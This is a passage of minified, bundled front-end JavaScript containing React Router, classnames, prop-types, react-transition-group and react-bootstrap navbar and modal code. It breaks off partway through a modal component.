    if (t === void 0 && (t = []), n === void 0 && (n = null), e == null) {
        var o;
        if ((o = n) != null && o.errors) e = n.matches; else return null
    }
    let i = e, l = (r = n) == null ? void 0 : r.errors;
    if (l != null) {
        let s = i.findIndex(a => a.route.id && (l == null ? void 0 : l[a.route.id]));
        s >= 0 || Re(!1), i = i.slice(0, Math.min(i.length, s + 1))
    }
    return i.reduceRight((s, a, u) => {
        let c = a.route.id ? l == null ? void 0 : l[a.route.id] : null, d = null;
        n && (d = a.route.errorElement || Dv);
        let p = t.concat(i.slice(0, u + 1)), x = () => {
            let y;
            return c ? y = d : a.route.Component ? y = f.createElement(a.route.Component, null) : a.route.element ? y = a.route.element : y = s, f.createElement($v, {
                match: a,
                routeContext: {outlet: s, matches: p, isDataRoute: n != null},
                children: y
            })
        };
        return n && (a.route.ErrorBoundary || a.route.errorElement || u === 0) ? f.createElement(Mv, {
            location: n.location,
            revalidation: n.revalidation,
            component: d,
            error: c,
            children: x(),
            routeContext: {outlet: null, matches: p, isDataRoute: !0}
        }) : x()
    }, null)
}

var Np = function (e) {
    return e.UseBlocker = "useBlocker", e.UseRevalidator = "useRevalidator", e.UseNavigateStable = "useNavigate", e
}(Np || {}), Ti = function (e) {
    return e.UseBlocker = "useBlocker", e.UseLoaderData = "useLoaderData", e.UseActionData = "useActionData", e.UseRouteError = "useRouteError", e.UseNavigation = "useNavigation", e.UseRouteLoaderData = "useRouteLoaderData", e.UseMatches = "useMatches", e.UseRevalidator = "useRevalidator", e.UseNavigateStable = "useNavigate", e.UseRouteId = "useRouteId", e
}(Ti || {});

function Av(e) {
    let t = f.useContext(Qa);
    return t || Re(!1), t
}

function zv(e) {
    let t = f.useContext(Ov);
    return t || Re(!1), t
}

function Bv(e) {
    let t = f.useContext(fr);
    return t || Re(!1), t
}

function Rp(e) {
    let t = Bv(), n = t.matches[t.matches.length - 1];
    return n.route.id || Re(!1), n.route.id
}

function Uv() {
    var e;
    let t = f.useContext(Cp), n = zv(Ti.UseRouteError), r = Rp(Ti.UseRouteError);
    return t || ((e = n.errors) == null ? void 0 : e[r])
}

function bv() {
    let {router: e} = Av(Np.UseNavigateStable), t = Rp(Ti.UseNavigateStable), n = f.useRef(!1);
    return kp(() => {
        n.current = !0
    }), f.useCallback(function (o, i) {
        i === void 0 && (i = {}), n.current && (typeof o == "number" ? e.navigate(o) : e.navigate(o, Ri({fromRouteId: t}, i)))
    }, [e, t])
}

function Hv(e) {
    let {
        basename: t = "/",
        children: n = null,
        location: r,
        navigationType: o = Ht.Pop,
        navigator: i,
        static: l = !1
    } = e;
    qi() && Re(!1);
    let s = t.replace(/^\/*/, "/"), a = f.useMemo(() => ({basename: s, navigator: i, static: l}), [s, i, l]);
    typeof r == "string" && (r = dr(r));
    let {pathname: u = "/", search: c = "", hash: d = "", state: p = null, key: x = "default"} = r,
        y = f.useMemo(() => {
            let v = xp(u, s);
            return v == null ? null : {location: {pathname: v, search: c, hash: d, state: p, key: x}, navigationType: o}
        }, [s, u, c, d, p, x, o]);
    return y == null ? null : f.createElement(Yi.Provider, {value: a}, f.createElement(Ji.Provider, {
        children: n,
        value: y
    }))
}

new Promise(() => {
});
/**
 * React Router DOM v6.17.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */const Wv = "startTransition", Nc = Kh[Wv];

function Vv(e) {
    let {basename: t, children: n, future: r, window: o} = e, i = f.useRef();
    i.current == null && (i.current = nv({window: o, v5Compat: !0}));
    let l = i.current, [s, a] = f.useState({action: l.action, location: l.location}), {v7_startTransition: u} = r || {},
        c = f.useCallback(d => {
            u && Nc ? Nc(() => a(d)) : a(d)
        }, [a, u]);
    return f.useLayoutEffect(() => l.listen(c), [l, c]), f.createElement(Hv, {
        basename: t,
        children: n,
        location: s.location,
        navigationType: s.action,
        navigator: l
    })
}

var Rc;
(function (e) {
    e.UseScrollRestoration = "useScrollRestoration", e.UseSubmit = "useSubmit", e.UseSubmitFetcher = "useSubmitFetcher", e.UseFetcher = "useFetcher", e.useViewTransitionState = "useViewTransitionState"
})(Rc || (Rc = {}));
var Tc;
(function (e) {
    e.UseFetchers = "useFetchers", e.UseScrollRestoration = "useScrollRestoration"
})(Tc || (Tc = {}));
var Tp = {exports: {}};/*!
	Copyright (c) 2018 Jed Watson.
	Licensed under the MIT License (MIT), see
	http://jedwatson.github.io/classnames
*/
(function (e) {
    (function () {
        var t = {}.hasOwnProperty;

        function n() {
            for (var r = [], o = 0; o < arguments.length; o++) {
                var i = arguments[o];
                if (i) {
                    var l = typeof i;
                    if (l === "string" || l === "number") r.push(i); else if (Array.isArray(i)) {
                        if (i.length) {
                            var s = n.apply(null, i);
                            s && r.push(s)
                        }
                    } else if (l === "object") {
                        if (i.toString !== Object.prototype.toString && !i.toString.toString().includes("[native code]")) {
                            r.push(i.toString());
                            continue
                        }
                        for (var a in i) t.call(i, a) && i[a] && r.push(a)
                    }
                }
            }
            return r.join(" ")
        }

        e.exports ? (n.default = n, e.exports = n) : window.classNames = n
    })()
})(Tp);
var Kv = Tp.exports;
const L = Ii(Kv), Gv = ["xxl", "xl", "lg", "md", "sm", "xs"], Qv = "xs",
    el = f.createContext({prefixes: {}, breakpoints: Gv, minBreakpoint: Qv});

function F(e, t) {
    const {prefixes: n} = f.useContext(el);
    return e || n[t] || t
}

function jp() {
    const {breakpoints: e} = f.useContext(el);
    return e
}

function Op() {
    const {minBreakpoint: e} = f.useContext(el);
    return e
}

function Xv() {
    const {dir: e} = f.useContext(el);
    return e === "rtl"
}

const _p = f.forwardRef(({bsPrefix: e, fluid: t = !1, as: n = "div", className: r, ...o}, i) => {
    const l = F(e, "container"), s = typeof t == "string" ? `-${t}` : "-fluid";
    return m.jsx(n, {ref: i, ...o, className: L(r, t ? `${l}${s}` : l)})
});
_p.displayName = "Container";
const lr = _p, Yv = f.createContext(null), Jv = Yv;

function Bs() {
    return Bs = Object.assign ? Object.assign.bind() : function (e) {
        for (var t = 1; t < arguments.length; t++) {
            var n = arguments[t];
            for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
        }
        return e
    }, Bs.apply(this, arguments)
}

function Pp(e, t) {
    if (e == null) return {};
    var n = {}, r = Object.keys(e), o, i;
    for (i = 0; i < r.length; i++) o = r[i], !(t.indexOf(o) >= 0) && (n[o] = e[o]);
    return n
}

function jc(e) {
    return "default" + e.charAt(0).toUpperCase() + e.substr(1)
}

function qv(e) {
    var t = Zv(e, "string");
    return typeof t == "symbol" ? t : String(t)
}

function Zv(e, t) {
    if (typeof e != "object" || e === null) return e;
    var n = e[Symbol.toPrimitive];
    if (n !== void 0) {
        var r = n.call(e, t || "default");
        if (typeof r != "object") return r;
        throw new TypeError("@@toPrimitive must return a primitive value.")
    }
    return (t === "string" ? String : Number)(e)
}

function e0(e, t, n) {
    var r = f.useRef(e !== void 0), o = f.useState(t), i = o[0], l = o[1], s = e !== void 0, a = r.current;
    return r.current = s, !s && a && i !== t && l(t), [s ? e : i, f.useCallback(function (u) {
        for (var c = arguments.length, d = new Array(c > 1 ? c - 1 : 0), p = 1; p < c; p++) d[p - 1] = arguments[p];
        n && n.apply(void 0, [u].concat(d)), l(u)
    }, [n])]
}

function t0(e, t) {
    return Object.keys(t).reduce(function (n, r) {
        var o, i = n, l = i[jc(r)], s = i[r], a = Pp(i, [jc(r), r].map(qv)), u = t[r], c = e0(s, l, e[u]), d = c[0],
            p = c[1];
        return Bs({}, a, (o = {}, o[r] = d, o[u] = p, o))
    }, e)
}

function Us(e, t) {
    return Us = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function (r, o) {
        return r.__proto__ = o, r
    }, Us(e, t)
}

function n0(e, t) {
    e.prototype = Object.create(t.prototype), e.prototype.constructor = e, Us(e, t)
}

const Lp = f.forwardRef(({bsPrefix: e, className: t, as: n, ...r}, o) => {
    e = F(e, "navbar-brand");
    const i = n || (r.href ? "a" : "span");
    return m.jsx(i, {...r, ref: o, className: L(t, e)})
});
Lp.displayName = "NavbarBrand";
const r0 = Lp;

function tl(e) {
    return e && e.ownerDocument || document
}

function o0(e) {
    var t = tl(e);
    return t && t.defaultView || window
}

function i0(e, t) {
    return o0(e).getComputedStyle(e, t)
}

var l0 = /([A-Z])/g;

function s0(e) {
    return e.replace(l0, "-$1").toLowerCase()
}

var a0 = /^ms-/;

function zo(e) {
    return s0(e).replace(a0, "-ms-")
}

var u0 = /^((translate|rotate|scale)(X|Y|Z|3d)?|matrix(3d)?|perspective|skew(X|Y)?)$/i;

function c0(e) {
    return !!(e && u0.test(e))
}

function Et(e, t) {
    var n = "", r = "";
    if (typeof t == "string") return e.style.getPropertyValue(zo(t)) || i0(e).getPropertyValue(zo(t));
    Object.keys(t).forEach(function (o) {
        var i = t[o];
        !i && i !== 0 ? e.style.removeProperty(zo(o)) : c0(o) ? r += o + "(" + i + ") " : n += zo(o) + ": " + i + ";"
    }), r && (n += "transform: " + r + ";"), e.style.cssText += ";" + n
}

var Ip = {exports: {}}, d0 = "SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED", f0 = d0, p0 = f0;

function Dp() {
}

function Mp() {
}

Mp.resetWarningCache = Dp;
var m0 = function () {
    function e(r, o, i, l, s, a) {
        if (a !== p0) {
            var u = new Error("Calling PropTypes validators directly is not supported by the `prop-types` package. Use PropTypes.checkPropTypes() to call them. Read more at http://fb.me/use-check-prop-types");
            throw u.name = "Invariant Violation", u
        }
    }

    e.isRequired = e;

    function t() {
        return e
    }

    var n = {
        array: e,
        bigint: e,
        bool: e,
        func: e,
        number: e,
        object: e,
        string: e,
        symbol: e,
        any: e,
        arrayOf: t,
        element: e,
        elementType: e,
        instanceOf: t,
        node: e,
        objectOf: t,
        oneOf: t,
        oneOfType: t,
        shape: t,
        exact: t,
        checkPropTypes: Mp,
        resetWarningCache: Dp
    };
    return n.PropTypes = n, n
};
Ip.exports = m0();
var h0 = Ip.exports;
const ke = Ii(h0), Oc = {disabled: !1}, $p = $.createContext(null);
var g0 = function (t) {
    return t.scrollTop
}, Mr = "unmounted", Ft = "exited", ot = "entering", wt = "entered", uo = "exiting", Pt = function (e) {
    n0(t, e);

    function t(r, o) {
        var i;
        i = e.call(this, r, o) || this;
        var l = o, s = l && !l.isMounting ? r.enter : r.appear, a;
        return i.appearStatus = null, r.in ? s ? (a = Ft, i.appearStatus = ot) : a = wt : r.unmountOnExit || r.mountOnEnter ? a = Mr : a = Ft, i.state = {status: a}, i.nextCallback = null, i
    }

    t.getDerivedStateFromProps = function (o, i) {
        var l = o.in;
        return l && i.status === Mr ? {status: Ft} : null
    };
    var n = t.prototype;
    return n.componentDidMount = function () {
        this.updateStatus(!0, this.appearStatus)
    }, n.componentDidUpdate = function (o) {
        var i = null;
        if (o !== this.props) {
            var l = this.state.status;
            this.props.in ? l !== ot && l !== wt && (i = ot) : (l === ot || l === wt) && (i = uo)
        }
        this.updateStatus(!1, i)
    }, n.componentWillUnmount = function () {
        this.cancelNextCallback()
    }, n.getTimeouts = function () {
        var o = this.props.timeout, i, l, s;
        return i = l = s = o, o != null && typeof o != "number" && (i = o.exit, l = o.enter, s = o.appear !== void 0 ? o.appear : l), {
            exit: i,
            enter: l,
            appear: s
        }
    }, n.updateStatus = function (o, i) {
        if (o === void 0 && (o = !1), i !== null) if (this.cancelNextCallback(), i === ot) {
            if (this.props.unmountOnExit || this.props.mountOnEnter) {
                var l = this.props.nodeRef ? this.props.nodeRef.current : Hn.findDOMNode(this);
                l && g0(l)
            }
            this.performEnter(o)
        } else this.performExit(); else this.props.unmountOnExit && this.state.status === Ft && this.setState({status: Mr})
    }, n.performEnter = function (o) {
        var i = this, l = this.props.enter, s = this.context ? this.context.isMounting : o,
            a = this.props.nodeRef ? [s] : [Hn.findDOMNode(this), s], u = a[0], c = a[1], d = this.getTimeouts(),
            p = s ? d.appear : d.enter;
        if (!o && !l || Oc.disabled) {
            this.safeSetState({status: wt}, function () {
                i.props.onEntered(u)
            });
            return
        }
        this.props.onEnter(u, c), this.safeSetState({status: ot}, function () {
            i.props.onEntering(u, c), i.onTransitionEnd(p, function () {
                i.safeSetState({status: wt}, function () {
                    i.props.onEntered(u, c)
                })
            })
        })
    }, n.performExit = function () {
        var o = this, i = this.props.exit, l = this.getTimeouts(),
            s = this.props.nodeRef ? void 0 : Hn.findDOMNode(this);
        if (!i || Oc.disabled) {
            this.safeSetState({status: Ft}, function () {
                o.props.onExited(s)
            });
            return
        }
        this.props.onExit(s), this.safeSetState({status: uo}, function () {
            o.props.onExiting(s), o.onTransitionEnd(l.exit, function () {
                o.safeSetState({status: Ft}, function () {
                    o.props.onExited(s)
                })
            })
        })
    }, n.cancelNextCallback = function () {
        this.nextCallback !== null && (this.nextCallback.cancel(), this.nextCallback = null)
    }, n.safeSetState = function (o, i) {
        i = this.setNextCallback(i), this.setState(o, i)
    }, n.setNextCallback = function (o) {
        var i = this, l = !0;
        return this.nextCallback = function (s) {
            l && (l = !1, i.nextCallback = null, o(s))
        }, this.nextCallback.cancel = function () {
            l = !1
        }, this.nextCallback
    }, n.onTransitionEnd = function (o, i) {
        this.setNextCallback(i);
        var l = this.props.nodeRef ? this.props.nodeRef.current : Hn.findDOMNode(this),
            s = o == null && !this.props.addEndListener;
        if (!l || s) {
            setTimeout(this.nextCallback, 0);
            return
        }
        if (this.props.addEndListener) {
            var a = this.props.nodeRef ? [this.nextCallback] : [l, this.nextCallback], u = a[0], c = a[1];
            this.props.addEndListener(u, c)
        }
        o != null && setTimeout(this.nextCallback, o)
    }, n.render = function () {
        var o = this.state.status;
        if (o === Mr) return null;
        var i = this.props, l = i.children;
        i.in, i.mountOnEnter, i.unmountOnExit, i.appear, i.enter, i.exit, i.timeout, i.addEndListener, i.onEnter, i.onEntering, i.onEntered, i.onExit, i.onExiting, i.onExited, i.nodeRef;
        var s = Pp(i, ["children", "in", "mountOnEnter", "unmountOnExit", "appear", "enter", "exit", "timeout", "addEndListener", "onEnter", "onEntering", "onEntered", "onExit", "onExiting", "onExited", "nodeRef"]);
        return $.createElement($p.Provider, {value: null}, typeof l == "function" ? l(o, s) : $.cloneElement($.Children.only(l), s))
    }, t
}($.Component);
Pt.contextType = $p;
Pt.propTypes = {};

function jn() {
}

Pt.defaultProps = {
    in: !1,
    mountOnEnter: !1,
    unmountOnExit: !1,
    appear: !1,
    enter: !0,
    exit: !0,
    onEnter: jn,
    onEntering: jn,
    onEntered: jn,
    onExit: jn,
    onExiting: jn,
    onExited: jn
};
Pt.UNMOUNTED = Mr;
Pt.EXITED = Ft;
Pt.ENTERING = ot;
Pt.ENTERED = wt;
Pt.EXITING = uo;
const y0 = Pt, pr = !!(typeof window < "u" && window.document && window.document.createElement);
var bs = !1, Hs = !1;
try {
    var Fl = {
        get passive() {
            return bs = !0
        }, get once() {
            return Hs = bs = !0
        }
    };
    pr && (window.addEventListener("test", Fl, Fl), window.removeEventListener("test", Fl, !0))
} catch {
}

function Fp(e, t, n, r) {
    if (r && typeof r != "boolean" && !Hs) {
        var o = r.once, i = r.capture, l = n;
        !Hs && o && (l = n.__once || function s(a) {
            this.removeEventListener(t, s, i), n.call(this, a)
        }, n.__once = l), e.addEventListener(t, l, bs ? r : i)
    }
    e.addEventListener(t, n, r)
}

function Ws(e, t, n, r) {
    var o = r && typeof r != "boolean" ? r.capture : r;
    e.removeEventListener(t, n, o), n.__once && e.removeEventListener(t, n.__once, o)
}

function ji(e, t, n, r) {
    return Fp(e, t, n, r), function () {
        Ws(e, t, n, r)
    }
}

function v0(e, t, n, r) {
    if (n === void 0 && (n = !1), r === void 0 && (r = !0), e) {
        var o = document.createEvent("HTMLEvents");
        o.initEvent(t, n, r), e.dispatchEvent(o)
    }
}

function w0(e) {
    var t = Et(e, "transitionDuration") || "", n = t.indexOf("ms") === -1 ? 1e3 : 1;
    return parseFloat(t) * n
}

function x0(e, t, n) {
    n === void 0 && (n = 5);
    var r = !1, o = setTimeout(function () {
        r || v0(e, "transitionend", !0)
    }, t + n), i = ji(e, "transitionend", function () {
        r = !0
    }, {once: !0});
    return function () {
        clearTimeout(o), i()
    }
}

function Ap(e, t, n, r) {
    n == null && (n = w0(e) || 0);
    var o = x0(e, n, r), i = ji(e, "transitionend", t);
    return function () {
        o(), i()
    }
}

function _c(e, t) {
    const n = Et(e, t) || "", r = n.indexOf("ms") === -1 ? 1e3 : 1;
    return parseFloat(n) * r
}

function Xa(e, t) {
    const n = _c(e, "transitionDuration"), r = _c(e, "transitionDelay"), o = Ap(e, i => {
        i.target === e && (o(), t(i))
    }, n + r)
}

function Tr(...e) {
    return e.filter(t => t != null).reduce((t, n) => {
        if (typeof n != "function") throw new Error("Invalid Argument Type, must only provide functions, undefined, or null.");
        return t === null ? n : function (...o) {
            t.apply(this, o), n.apply(this, o)
        }
    }, null)
}

function zp(e) {
    e.offsetHeight
}

const Pc = e => !e || typeof e == "function" ? e : t => {
    e.current = t
};

function S0(e, t) {
    const n = Pc(e), r = Pc(t);
    return o => {
        n && n(o), r && r(o)
    }
}

function nl(e, t) {
    return f.useMemo(() => S0(e, t), [e, t])
}

function C0(e) {
    return e && "setState" in e ? Hn.findDOMNode(e) : e ?? null
}

const E0 = $.forwardRef(({
                             onEnter: e,
                             onEntering: t,
                             onEntered: n,
                             onExit: r,
                             onExiting: o,
                             onExited: i,
                             addEndListener: l,
                             children: s,
                             childRef: a,
                             ...u
                         }, c) => {
    const d = f.useRef(null), p = nl(d, a), x = N => {
            p(C0(N))
        }, y = N => R => {
            N && d.current && N(d.current, R)
        }, v = f.useCallback(y(e), [e]), C = f.useCallback(y(t), [t]), g = f.useCallback(y(n), [n]),
        h = f.useCallback(y(r), [r]), w = f.useCallback(y(o), [o]), S = f.useCallback(y(i), [i]),
        E = f.useCallback(y(l), [l]);
    return m.jsx(y0, {
        ref: c, ...u,
        onEnter: v,
        onEntered: g,
        onEntering: C,
        onExit: h,
        onExited: S,
        onExiting: w,
        addEndListener: E,
        nodeRef: d,
        children: typeof s == "function" ? (N, R) => s(N, {...R, ref: x}) : $.cloneElement(s, {ref: x})
    })
}), Ya = E0, k0 = {height: ["marginTop", "marginBottom"], width: ["marginLeft", "marginRight"]};

function N0(e, t) {
    const n = `offset${e[0].toUpperCase()}${e.slice(1)}`, r = t[n], o = k0[e];
    return r + parseInt(Et(t, o[0]), 10) + parseInt(Et(t, o[1]), 10)
}

const R0 = {[Ft]: "collapse", [uo]: "collapsing", [ot]: "collapsing", [wt]: "collapse show"}, T0 = $.forwardRef(({
                                                                                                                     onEnter: e,
                                                                                                                     onEntering: t,
                                                                                                                     onEntered: n,
                                                                                                                     onExit: r,
                                                                                                                     onExiting: o,
                                                                                                                     className: i,
                                                                                                                     children: l,
                                                                                                                     dimension: s = "height",
                                                                                                                     in: a = !1,
                                                                                                                     timeout: u = 300,
                                                                                                                     mountOnEnter: c = !1,
                                                                                                                     unmountOnExit: d = !1,
                                                                                                                     appear: p = !1,
                                                                                                                     getDimensionValue: x = N0,
                                                                                                                     ...y
                                                                                                                 }, v) => {
    const C = typeof s == "function" ? s() : s, g = f.useMemo(() => Tr(N => {
        N.style[C] = "0"
    }, e), [C, e]), h = f.useMemo(() => Tr(N => {
        const R = `scroll${C[0].toUpperCase()}${C.slice(1)}`;
        N.style[C] = `${N[R]}px`
    }, t), [C, t]), w = f.useMemo(() => Tr(N => {
        N.style[C] = null
    }, n), [C, n]), S = f.useMemo(() => Tr(N => {
        N.style[C] = `${x(C, N)}px`, zp(N)
    }, r), [r, x, C]), E = f.useMemo(() => Tr(N => {
        N.style[C] = null
    }, o), [C, o]);
    return m.jsx(Ya, {
        ref: v,
        addEndListener: Xa, ...y,
        "aria-expanded": y.role ? a : null,
        onEnter: g,
        onEntering: h,
        onEntered: w,
        onExit: S,
        onExiting: E,
        childRef: l.ref,
        in: a,
        timeout: u,
        mountOnEnter: c,
        unmountOnExit: d,
        appear: p,
        children: (N, R) => $.cloneElement(l, {
            ...R,
            className: L(i, l.props.className, R0[N], C === "width" && "collapse-horizontal")
        })
    })
}), j0 = T0, Bp = f.createContext(null);
Bp.displayName = "NavbarContext";
const yo = Bp, Up = f.forwardRef(({children: e, bsPrefix: t, ...n}, r) => {
    t = F(t, "navbar-collapse");
    const o = f.useContext(yo);
    return m.jsx(j0, {in: !!(o && o.expanded), ...n, children: m.jsx("div", {ref: r, className: t, children: e})})
});
Up.displayName = "NavbarCollapse";
const O0 = Up;

function _0(e) {
    const t = f.useRef(e);
    return f.useEffect(() => {
        t.current = e
    }, [e]), t
}

function Ge(e) {
    const t = _0(e);
    return f.useCallback(function (...n) {
        return t.current && t.current(...n)
    }, [t])
}

const bp = f.forwardRef(({
                             bsPrefix: e,
                             className: t,
                             children: n,
                             label: r = "Toggle navigation",
                             as: o = "button",
                             onClick: i,
                             ...l
                         }, s) => {
    e = F(e, "navbar-toggler");
    const {onToggle: a, expanded: u} = f.useContext(yo) || {}, c = Ge(d => {
        i && i(d), a && a()
    });
    return o === "button" && (l.type = "button"), m.jsx(o, {
        ...l,
        ref: s,
        onClick: c,
        "aria-label": r,
        className: L(t, e, !u && "collapsed"),
        children: n || m.jsx("span", {className: `${e}-icon`})
    })
});
bp.displayName = "NavbarToggle";
const P0 = bp, L0 = typeof global < "u" && global.navigator && global.navigator.product === "ReactNative",
    I0 = typeof document < "u", Vs = I0 || L0 ? f.useLayoutEffect : f.useEffect, Ks = new WeakMap, Lc = (e, t) => {
        if (!e || !t) return;
        const n = Ks.get(t) || new Map;
        Ks.set(t, n);
        let r = n.get(e);
        return r || (r = t.matchMedia(e), r.refCount = 0, n.set(r.media, r)), r
    };

function D0(e, t = typeof window > "u" ? void 0 : window) {
    const n = Lc(e, t), [r, o] = f.useState(() => n ? n.matches : !1);
    return Vs(() => {
        let i = Lc(e, t);
        if (!i) return o(!1);
        let l = Ks.get(t);
        const s = () => {
            o(i.matches)
        };
        return i.refCount++, i.addListener(s), s(), () => {
            i.removeListener(s), i.refCount--, i.refCount <= 0 && (l == null || l.delete(i.media)), i = void 0
        }
    }, [e]), r
}

function M0(e) {
    const t = Object.keys(e);

    function n(s, a) {
        return s === a ? a : s ? `${s} and ${a}` : a
    }

    function r(s) {
        return t[Math.min(t.indexOf(s) + 1, t.length - 1)]
    }

    function o(s) {
        const a = r(s);
        let u = e[a];
        return typeof u == "number" ? u = `${u - .2}px` : u = `calc(${u} - 0.2px)`, `(max-width: ${u})`
    }

    function i(s) {
        let a = e[s];
        return typeof a == "number" && (a = `${a}px`), `(min-width: ${a})`
    }

    function l(s, a, u) {
        let c;
        typeof s == "object" ? (c = s, u = a, a = !0) : (a = a || !0, c = {[s]: a});
        let d = f.useMemo(() => Object.entries(c).reduce((p, [x, y]) => ((y === "up" || y === !0) && (p = n(p, i(x))), (y === "down" || y === !0) && (p = n(p, o(x))), p), ""), [JSON.stringify(c)]);
        return D0(d, u)
    }

    return l
}

const $0 = M0({xs: 0, sm: 576, md: 768, lg: 992, xl: 1200, xxl: 1400});

function Al(e) {
    e === void 0 && (e = tl());
    try {
        var t = e.activeElement;
        return !t || !t.nodeName ? null : t
    } catch {
        return e.body
    }
}

function Ic(e, t) {
    if (e.contains) return e.contains(t);
    if (e.compareDocumentPosition) return e === t || !!(e.compareDocumentPosition(t) & 16)
}

function F0() {
    const e = f.useRef(!0), t = f.useRef(() => e.current);
    return f.useEffect(() => (e.current = !0, () => {
        e.current = !1
    }), []), t.current
}

function A0(e) {
    const t = f.useRef(e);
    return t.current = e, t
}

function Hp(e) {
    const t = A0(e);
    f.useEffect(() => () => t.current(), [])
}

function z0(e) {
    const t = f.useRef(null);
    return f.useEffect(() => {
        t.current = e
    }), t.current
}

const B0 = "data-rr-ui-";

function U0(e) {
    return `${B0}${e}`
}

function b0(e = document) {
    const t = e.defaultView;
    return Math.abs(t.innerWidth - e.documentElement.clientWidth)
}

const Dc = U0("modal-open");

class H0 {
    constructor({ownerDocument: t, handleContainerOverflow: n = !0, isRTL: r = !1} = {}) {
        this.handleContainerOverflow = n, this.isRTL = r, this.modals = [], this.ownerDocument = t
    }

    getScrollbarWidth() {
        return b0(this.ownerDocument)
    }

    getElement() {
        return (this.ownerDocument || document).body
    }

    setModalAttributes(t) {
    }

    removeModalAttributes(t) {
    }

    setContainerStyle(t) {
        const n = {overflow: "hidden"}, r = this.isRTL ? "paddingLeft" : "paddingRight", o = this.getElement();
        t.style = {
            overflow: o.style.overflow,
            [r]: o.style[r]
        }, t.scrollBarWidth && (n[r] = `${parseInt(Et(o, r) || "0", 10) + t.scrollBarWidth}px`), o.setAttribute(Dc, ""), Et(o, n)
    }

    reset() {
        [...this.modals].forEach(t => this.remove(t))
    }

    removeContainerStyle(t) {
        const n = this.getElement();
        n.removeAttribute(Dc), Object.assign(n.style, t.style)
    }

    add(t) {
        let n = this.modals.indexOf(t);
        return n !== -1 || (n = this.modals.length, this.modals.push(t), this.setModalAttributes(t), n !== 0) || (this.state = {
            scrollBarWidth: this.getScrollbarWidth(),
            style: {}
        }, this.handleContainerOverflow && this.setContainerStyle(this.state)), n
    }

    remove(t) {
        const n = this.modals.indexOf(t);
        n !== -1 && (this.modals.splice(n, 1), !this.modals.length && this.handleContainerOverflow && this.removeContainerStyle(this.state), this.removeModalAttributes(t))
    }

    isTopModal(t) {
        return !!this.modals.length && this.modals[this.modals.length - 1] === t
    }
}

const Ja = H0, Wp = f.createContext(pr ? window : void 0);
Wp.Provider;

function qa() {
    return f.useContext(Wp)
}

const zl = (e, t) => pr ? e == null ? (t || tl()).body : (typeof e == "function" && (e = e()), e && "current" in e && (e = e.current), e && ("nodeType" in e || e.getBoundingClientRect) ? e : null) : null;

function W0(e, t) {
    const n = qa(), [r, o] = f.useState(() => zl(e, n == null ? void 0 : n.document));
    if (!r) {
        const i = zl(e);
        i && o(i)
    }
    return f.useEffect(() => {
        t && r && t(r)
    }, [t, r]), f.useEffect(() => {
        const i = zl(e);
        i !== r && o(i)
    }, [e, r]), r
}

function V0({children: e, in: t, onExited: n, mountOnEnter: r, unmountOnExit: o}) {
    const i = f.useRef(null), l = f.useRef(t), s = Ge(n);
    f.useEffect(() => {
        t ? l.current = !0 : s(i.current)
    }, [t, s]);
    const a = nl(i, e.ref), u = f.cloneElement(e, {ref: a});
    return t ? u : o || !l.current && r ? null : u
}

function K0({in: e, onTransition: t}) {
    const n = f.useRef(null), r = f.useRef(!0), o = Ge(t);
    return Vs(() => {
        if (!n.current) return;
        let i = !1;
        return o({in: e, element: n.current, initial: r.current, isStale: () => i}), () => {
            i = !0
        }
    }, [e, o]), Vs(() => (r.current = !1, () => {
        r.current = !0
    }), []), n
}

function G0({children: e, in: t, onExited: n, onEntered: r, transition: o}) {
    const [i, l] = f.useState(!t);
    t && i && l(!1);
    const s = K0({
        in: !!t, onTransition: u => {
            const c = () => {
                u.isStale() || (u.in ? r == null || r(u.element, u.initial) : (l(!0), n == null || n(u.element)))
            };
            Promise.resolve(o(u)).then(c, d => {
                throw u.in || l(!0), d
            })
        }
    }), a = nl(s, e.ref);
    return i && !t ? null : f.cloneElement(e, {ref: a})
}

function Mc(e, t, n) {
    return e ? m.jsx(e, Object.assign({}, n)) : t ? m.jsx(G0, Object.assign({}, n, {transition: t})) : m.jsx(V0, Object.assign({}, n))
}

function Q0(e) {
    return e.code === "Escape" || e.keyCode === 27
}

const X0 = ["show", "role", "className", "style", "children", "backdrop", "keyboard", "onBackdropClick", "onEscapeKeyDown", "transition", "runTransition", "backdropTransition", "runBackdropTransition", "autoFocus", "enforceFocus", "restoreFocus", "restoreFocusOptions", "renderDialog", "renderBackdrop", "manager", "container", "onShow", "onHide", "onExit", "onExited", "onExiting", "onEnter", "onEntering", "onEntered"];

function Y0(e, t) {
    if (e == null) return {};
    var n = {}, r = Object.keys(e), o, i;
    for (i = 0; i < r.length; i++) o = r[i], !(t.indexOf(o) >= 0) && (n[o] = e[o]);
    return n
}

let Bl;

function J0(e) {
    return Bl || (Bl = new Ja({ownerDocument: e == null ? void 0 : e.document})), Bl
}

function q0(e) {
    const t = qa(), n = e || J0(t), r = f.useRef({dialog: null, backdrop: null});
    return Object.assign(r.current, {
        add: () => n.add(r.current),
        remove: () => n.remove(r.current),
        isTopModal: () => n.isTopModal(r.current),
        setDialogRef: f.useCallback(o => {
            r.current.dialog = o
        }, []),
        setBackdropRef: f.useCallback(o => {
            r.current.backdrop = o
        }, [])
    })
}

const Vp = f.forwardRef((e, t) => {
    let {
        show: n = !1,
        role: r = "dialog",
        className: o,
        style: i,
        children: l,
        backdrop: s = !0,
        keyboard: a = !0,
        onBackdropClick: u,
        onEscapeKeyDown: c,
        transition: d,
        runTransition: p,
        backdropTransition: x,
        runBackdropTransition: y,
        autoFocus: v = !0,
        enforceFocus: C = !0,
        restoreFocus: g = !0,
        restoreFocusOptions: h,
        renderDialog: w,
        renderBackdrop: S = te => m.jsx("div", Object.assign({}, te)),
        manager: E,
        container: N,
        onShow: R,
        onHide: O = () => {
        },
        onExit: B,
        onExited: D,
        onExiting: M,
        onEnter: A,
        onEntering: V,
        onEntered: ee
    } = e, fe = Y0(e, X0);
    const X = qa(), se = W0(N), j = q0(E), P = F0(), I = z0(n), [b, W] = f.useState(!n), ye = f.useRef(null);
    f.useImperativeHandle(t, () => j, [j]), pr && !I && n && (ye.current = Al(X == null ? void 0 : X.document)), n && b && W(!1);
    const je = Ge(() => {
        if (j.add(), Nn.current = ji(document, "keydown", ul), kn.current = ji(document, "focus", () => setTimeout(Se), !0), R && R(), v) {
            var te, So;
            const vr = Al((te = (So = j.dialog) == null ? void 0 : So.ownerDocument) != null ? te : X == null ? void 0 : X.document);
